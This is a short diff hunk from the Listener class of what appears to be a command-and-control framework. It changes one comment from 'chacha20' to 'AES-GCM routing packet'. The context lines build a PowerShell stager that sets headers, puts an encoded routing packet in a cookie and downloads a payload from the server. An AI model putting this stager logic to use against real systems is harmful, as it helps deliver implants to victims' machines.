@@ -324,7 +324,7 @@ class Listener:
                         "$wc.Headers.Add(" + f"'{headerKey}','" + headerValue + "');"
                     )
 
-            # add the chacha20 packet to a cookie
+            # add the AES-GCM routing packet to a cookie
             stager += f'$wc.Headers.Add("Cookie","{cookie}={b64RoutingPacket.decode("UTF-8")}");'
             stager += "$data=$wc.DownloadData($ser+$t);"
 
